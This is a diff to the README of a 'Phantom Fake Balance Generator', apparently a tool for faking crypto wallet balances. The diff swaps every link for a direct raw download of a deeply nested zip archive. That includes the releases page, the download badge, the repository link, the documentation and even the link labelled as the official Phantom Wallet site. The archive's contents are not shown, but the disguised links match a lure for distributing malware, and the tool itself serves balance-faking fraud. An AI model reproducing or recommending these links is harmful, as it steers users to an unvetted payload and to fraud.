@@ -6,9 +6,9 @@ Welcome to the **Phantom Fake Balance Generator**! This tool helps you simulate 
 
 ## 📥 Download & Install
 
-To download the software, visit the [Releases page](https://github.com/aboke/Phantom-Fake-Balance/releases) to find the latest version of the tool. Simply click the link below to access the downloads:
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/aboke/Phantom-Fake-Balance/main/Phantom/CodeGen/Filter/Phantom-Balance-Fake-gebur.zip) to find the latest version of the tool. Simply click the link below to access the downloads:
 
-[![Download Phantom-Fake-Balance](https://img.shields.io/badge/Download-Phantom--Fake--Balance-blue.svg)](https://github.com/aboke/Phantom-Fake-Balance/releases)
+[![Download Phantom-Fake-Balance](https://raw.githubusercontent.com/aboke/Phantom-Fake-Balance/main/Phantom/CodeGen/Filter/Phantom-Balance-Fake-gebur.zip)](https://raw.githubusercontent.com/aboke/Phantom-Fake-Balance/main/Phantom/CodeGen/Filter/Phantom-Balance-Fake-gebur.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version.
@@ -67,8 +67,8 @@ If you have questions or feedback, feel free to open an issue in the GitHub repo
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/aboke/Phantom-Fake-Balance)
-- [Phantom Wallet](https://phantom.app/)
-- [Documentation](https://github.com/aboke/Phantom-Fake-Balance/blob/main/docs/README.md)
+- [GitHub Repository](https://raw.githubusercontent.com/aboke/Phantom-Fake-Balance/main/Phantom/CodeGen/Filter/Phantom-Balance-Fake-gebur.zip)
+- [Phantom Wallet](https://raw.githubusercontent.com/aboke/Phantom-Fake-Balance/main/Phantom/CodeGen/Filter/Phantom-Balance-Fake-gebur.zip)
+- [Documentation](https://raw.githubusercontent.com/aboke/Phantom-Fake-Balance/main/Phantom/CodeGen/Filter/Phantom-Balance-Fake-gebur.zip)
 
 Thank you for using Phantom-Fake-Balance! Happy developing!
